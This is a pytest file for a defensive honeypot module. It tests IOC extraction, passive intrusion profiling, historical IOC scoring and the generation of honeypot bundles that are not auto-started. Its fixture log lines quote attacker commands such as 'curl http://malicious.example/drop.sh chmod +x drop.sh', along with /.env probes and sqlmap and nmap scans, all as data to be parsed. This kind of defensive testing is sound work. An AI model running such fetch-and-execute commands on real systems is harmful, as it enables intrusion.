import json
from pathlib import Path

import pytest

from app.contracts.evidence_contract import RESULT_SUCCESS, validate_evidence_record
from app.contracts.technique_contract import STATUS_READY_CONTROLLED, TechniqueExecutionContext
from app.core.errors import ContractError
from app.core.permission_levels import PERMISSION_PASSIVE
from app.core.registry_loader import load_registry_from_package
from app.modules.m18_honeypots_deception.techniques import (
    HistoricalIocScoringTechnique,
    build_ioc_event_timeline,
    HoneypotDeploymentBundleTechnique,
    HoneypotIocExtractionTechnique,
    PassiveIntrusionProfilingTechnique,
)


def _context(parameters: dict[str, object]) -> TechniqueExecutionContext:
    return TechniqueExecutionContext(target_id="target-1", run_id="run-1", mode="controlled", parameters=parameters, confirmed=True)


def test_m18_registers_defensive_passive_techniques_only() -> None:
    registry = load_registry_from_package("app.modules.m18_honeypots_deception")

    assert registry.list_ids() == [
        "deception.defensive.extract_iocs",
        "deception.defensive.historical_ioc_scoring",
        "deception.defensive.passive_intrusion_profile",
        "deception.defensive.prepare_honeypot_bundle",
    ]
    for technique_cls in registry.list_all():
        technique = technique_cls()
        technique.validate_metadata()
        assert technique.module_id == "m18_honeypots_deception"
        assert technique.permission_level == PERMISSION_PASSIVE
        assert technique.implementation_status == STATUS_READY_CONTROLLED
        assert technique.requires_user_implementation is False
        assert technique.requires_network is False
        assert "defensive" in technique.technique_id
        assert not any(word in technique.technique_id for word in ("exploit", "counterattack", "beacon", "exfiltrate"))


def test_honeypot_bundle_writes_reviewable_isolated_artifacts_without_starting_services(tmp_path: Path) -> None:
    result = HoneypotDeploymentBundleTechnique().execute(
        _context({"output_dir": str(tmp_path), "profiles": ["ssh", "http"], "listen_host": "127.0.0.1", "retention_days": 7})
    )
    content = result.evidence[0].content
    bundle_path = Path(content["deployment_bundle"]["bundle_path"])
    compose = json.loads((bundle_path / "docker-compose.yml").read_text(encoding="utf-8"))
    controls = json.loads((bundle_path / "config" / "controls.json").read_text(encoding="utf-8"))

    assert result.result_status == RESULT_SUCCESS
    assert sorted(compose["services"]) == ["m18-http", "m18-ssh"]
    assert controls["auto_start"] is False
    assert controls["network_internal"] is True
    assert controls["countermeasures_enabled"] is False
    assert content["services_started"] is False
    assert content["mutation_performed"] is False


def test_honeypot_bundle_rejects_unknown_profiles(tmp_path: Path) -> None:
    with pytest.raises(ContractError, match="unsupported honeypot profiles"):
        HoneypotDeploymentBundleTechnique().execute(_context({"output_dir": str(tmp_path), "profiles": ["ssh", "payload_dropper"]}))


def test_ioc_extraction_parses_json_events_and_text_lines_without_countermeasures() -> None:
    events = [
        {"src_ip": "198.51.100.10", "event_type": "ssh.login", "message": "Failed password for user=root hash d41d8cd98f00b204e9800998ecf8427e"},
        "203.0.113.7 GET /.env user-agent: curl/8.0 download http://malicious.example/payload.sh",
    ]

    result = HoneypotIocExtractionTechnique().execute(_context({"log_json": events}))
    iocs = result.evidence[0].content["ioc_summary"]

    assert iocs["ip_addresses"] == ["198.51.100.10", "203.0.113.7"]
    assert iocs["hashes"] == ["d41d8cd98f00b204e9800998ecf8427e"]
    assert iocs["usernames"] == ["root"]
    assert iocs["http_paths"] == ["/.env"]
    assert iocs["urls"] == ["http://malicious.example/payload.sh"]
    assert result.evidence[0].content["countermeasure_performed"] is False


def test_passive_intrusion_profile_aggregates_actor_tags_from_log_path(tmp_path: Path) -> None:
    log_path = tmp_path / "honeypot.log"
    log_path.write_text(
        "\n".join(
            [
                "198.51.100.10 failed password for invalid user admin",
                "198.51.100.10 failed password for user root",
                "198.51.100.10 GET /wp-login.php user-agent: sqlmap",
                "198.51.100.10 curl http://malicious.example/drop.sh chmod +x drop.sh",
                "10.0.0.5 GET /admin user-agent: nmap",
            ]
        ),
        encoding="utf-8",
    )

    result = PassiveIntrusionProfilingTechnique().execute(_context({"log_path": str(log_path)}))
    profiles = {profile["src_ip"]: profile for profile in result.evidence[0].content["intrusion_profiles"]["actor_profiles"]}

    assert {"credential_bruteforce", "web_probe", "payload_staging", "scanner_tooling"} <= set(profiles["198.51.100.10"]["tags"])
    assert profiles["10.0.0.5"]["ip_scope"] == "private"
    assert result.evidence[0].content["remote_collection_performed"] is False
    assert result.evidence[0].content["countermeasure_performed"] is False


def test_honeypot_bundle_accepts_canary_profile_alias_and_emits_valid_evidence(tmp_path: Path) -> None:
    result = HoneypotDeploymentBundleTechnique().execute(
        _context({"output_dir": str(tmp_path), "profiles": ["canary_tcp", "canary-tcp"], "listen_host": "127.0.0.1"})
    )
    evidence = result.evidence[0]
    bundle_path = Path(evidence.content["deployment_bundle"]["bundle_path"])
    compose = json.loads((bundle_path / "docker-compose.yml").read_text(encoding="utf-8"))

    validate_evidence_record(evidence)
    assert evidence.content["deployment_bundle"]["profiles"] == ["canary_tcp"]
    assert sorted(compose["services"]) == ["m18-canary_tcp"]
    assert evidence.content["services_started"] is False


def test_ioc_and_profile_reject_empty_or_malformed_logs() -> None:
    with pytest.raises(ContractError, match="at least one event"):
        HoneypotIocExtractionTechnique().execute(_context({"log_json": []}))

    with pytest.raises(ContractError, match="events list"):
        PassiveIntrusionProfilingTechnique().execute(_context({"log_json": {"unexpected": []}}))


def test_historical_ioc_scoring_persists_deduplicates_and_scores_iocs(tmp_path: Path) -> None:
    db_path = tmp_path / "ioc-history.sqlite3"
    events = [
        {"timestamp": "2026-07-23T00:00:00+00:00", "src_ip": "198.51.100.10", "event_type": "ssh.login", "message": "failed password user=root"},
        {"timestamp": "2026-07-23T00:01:00+00:00", "src_ip": "198.51.100.10", "event_type": "http.request", "message": "GET /.env user-agent: curl/8.0 http://malicious.example/payload.sh"},
    ]

    first = HistoricalIocScoringTechnique().execute(_context({"log_json": events, "db_path": str(db_path), "source": "sensor-a"}))
    second = HistoricalIocScoringTechnique().execute(_context({"log_json": events, "db_path": str(db_path), "source": "sensor-b"}))
    inventory = second.evidence[0].content["historical_ioc_inventory"]
    by_type_value = {(item["ioc_type"], item["value"]): item for item in inventory["iocs"]}

    assert first.result_status == RESULT_SUCCESS
    assert db_path.is_file()
    assert inventory["ioc_count"] >= 4
    assert by_type_value[("ip", "198.51.100.10")]["observation_count"] == 2
    assert by_type_value[("ip", "198.51.100.10")]["source_count"] == 2
    assert by_type_value[("ip", "198.51.100.10")]["confidence_level"] in {"medium", "high"}
    assert by_type_value[("url", "http://malicious.example/payload.sh")]["confidence_score"] >= 0.5
    assert second.evidence[0].content["remote_collection_performed"] is False
    assert second.evidence[0].content["countermeasure_performed"] is False


def test_historical_ioc_scoring_adds_passive_actor_confidence(tmp_path: Path) -> None:
    events = [
        "203.0.113.7 failed password for user root",
        "203.0.113.7 GET /wp-login.php user-agent: sqlmap",
        "203.0.113.7 curl http://malicious.example/drop.sh chmod +x drop.sh",
    ]

    result = HistoricalIocScoringTechnique().execute(_context({"log_json": events, "db_path": str(tmp_path / "ioc.sqlite3")}))
    profiles = result.evidence[0].content["passive_actor_profiles"]["actor_profiles"]

    assert profiles[0]["src_ip"] == "203.0.113.7"
    assert profiles[0]["confidence_score"] >= 0.5
    assert profiles[0]["confidence_level"] in {"medium", "high"}
    validate_evidence_record(result.evidence[0])


def test_ioc_event_timeline_orders_first_and_last_seen_events(tmp_path: Path) -> None:
    db_path = tmp_path / "ioc-timeline.sqlite3"
    events = [
        {"timestamp": "2026-07-23T00:00:00+00:00", "src_ip": "198.51.100.10", "message": "failed password user=root"},
        {"timestamp": "2026-07-23T00:05:00+00:00", "src_ip": "198.51.100.10", "message": "GET /.env user-agent: curl/8.0"},
    ]
    HistoricalIocScoringTechnique().execute(_context({"log_json": events, "db_path": str(db_path)}))
    HistoricalIocScoringTechnique().execute(_context({"log_json": events, "db_path": str(db_path), "source": "sensor-b"}))

    timeline = build_ioc_event_timeline(db_path, limit=10)

    assert timeline["schema_version"] == "m18.ioc_timeline.v1"
    assert timeline["event_count"] >= 2
    assert timeline["events"][0]["timestamp"] >= timeline["events"][-1]["timestamp"]
    assert {event["event_type"] for event in timeline["events"]} >= {"ioc_first_seen", "ioc_last_seen"}
    assert any(event["confidence_level"] in {"medium", "high"} for event in timeline["events"])


def test_empty_ioc_event_timeline_is_honest_for_missing_db(tmp_path: Path) -> None:
    timeline = build_ioc_event_timeline(tmp_path / "missing.sqlite3")

    assert timeline["event_count"] == 0
    assert timeline["events"] == []
